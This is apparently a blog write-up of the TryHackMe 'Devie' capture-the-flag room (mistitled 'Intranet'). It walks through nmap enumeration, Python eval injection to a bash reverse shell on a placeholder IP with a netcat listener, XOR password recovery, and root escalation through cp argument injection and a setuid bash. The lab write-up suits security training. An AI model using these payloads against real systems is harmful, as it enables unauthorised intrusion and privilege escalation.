---
title: "Intranet TryHackMe"
collection: publications
permalink: /publication/devie
excerpt: 'This is a subscriber only room from TryHackMe'
date: 2023-06-28
venue: '06-28'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
#citation: 'Your Name, You. (2009). &quot;Paper Title Number 1.&quot; <i>Journal 1</i>. 1(1).'
---

![header](/images/devie-header.png)

**LINK :** [Devie](https://tryhackme.com/room/devie)

# Enumeration : 

* Let's start by looking for open ports.

```console
└─# nmap -sC -sV -T4 10.10.152.117
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 09:51 EDT
Nmap scan report for 10.10.152.117
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c9727bf5b62ed5995614de43093a6492 (RSA)
|   256 0b75585ab9f75ba9ffefad71c1090a33 (ECDSA)
|_  256 7df9c9f867f9954e016823a47b8c9830 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Tue, 27 Jun 2023 13:51:28 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 4486
|     Connection: close
```
* We have 2 open ports, ``ssh`` running on port ``22`` and a web application running on port ``5000``
* Visiting ``http://X.X.X.X:5000``, we see a Math Formulas page.

![devie1](/images/devie1.png)

* You can see below a link to download the code source.

![devie2](/images/devie2.png)

* We have 4 python scripts.
* The main function is in ``app.py``, while i was reading the script, i noticed that the ``bisect`` function uses ``eval`` which is vulnerable to command injection.

![devie3](/images/devie3.png)

> [Hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)

* All we need to do now is to inject a payload into the ``xa`` parameter of the ``bisect`` function, for that i will use ``burp suite``.

![devie4](/images/devie4.png)

# Flag 1 :

* As you can see we have to add ``#`` at the end of the injected payload to comment out the rest of the expression.

```console
__import__('os').system('/bin/bash -c \'bash+-i+>%26+/dev/tcp/<your-ip-address>/4444+0>%261\'')
```

> Dont forget to add your ip address and url-encode the payload.

![devie5](/images/devie5.png)

* Before send the request, you should open a netcat listener.

```console
nc -lvnp 4444
```

![devie6](/images/devie6.png)

# Flag 2 :

* I found a note in Bruce's home directory 

![devie7](/images/devie7.png)

* So as you can see Gordon shares his encoded XOR password.

* Let's see our sudo privileges

![devie8](/images/devie8.png)

* So as you can see we can run ``encrypt.py`` as ``gordon```

![devie9](/images/devie9.png)

* So the idea here is to enter ``hammertime4444`` as password and grab the output which XORed,base64-encoded password, then pass it to [Cyberchef](https://gchq.github.io/CyberChef/), As a recipe we will use ``from base64`` and ``XOR`` with the password entered using ``encrypt.py`` as the key.

![devie10](/images/devie10.png)

* [4] is the key

* Now we have the key used in the XOR operation.

> The special thing about ``XOR`` is because we know the initial and final value of the password, we can extract the key used in the XOR operation.

* Now it's time to decode the encoded string from Gordan's note using the key we found.

![devie11](/images/devie11.png)

* Switch user to ``Gordon`` and get your 2nd flag.

![devie12](/images/devie12.png)

> The password works also for ``SSH``.

# Flag 3 :

* We found a ``reports`` and ``backups`` folders which seems to be copies of each others with the copied files stored in the ``backups`` folder.

![devie13](/images/devie13.png)

* I spent a lot of times trying to figure out what's the next step until i noticed that the time of backups directory files changes every minutes and the ownership of these files is ``root`` so a backup job is most likely running as ``root``.

* It's time to use ``pspy`` to snoop on processes without need for root permissions.

> [Pspy](https://github.com/DominicBreuker/pspy)

![devie14](/images/devie14.png)

* As you can see there is a ``backup`` script that get executed every minute, let's see what this script is used for.

![devie15](/images/devie15.png)

* If we put any binary into ``reports`` folder, it will be copied to ``backups`` folder with ``root`` ownership.
* My idea is to copy ``/bin/bash`` to ``reports`` folder and assign it the **setuid bit**, but the problem is that privilege will not be copied by ``cp`` command by default, fortunately we can create a file named ``--preserve=mode`` so the permission is maintained when it gets copied to the ``backups`` folder.

> [Preservation mode](https://www.makeuseof.com/preserve-file-permissions-in-linux-while-copying-them/)

![devie16](/images/devie16.png)

![devie17](/images/devie17.png)

* We wait one minute for the cron to execute, change directory to ``backups`` folder and you should see the ``bash`` binary with **setuid bit**.

![devie18](/images/devie8.png)

* Execute this command and get the root flag.

```console
./bash -p
```

![devie19](/images/devie19.png)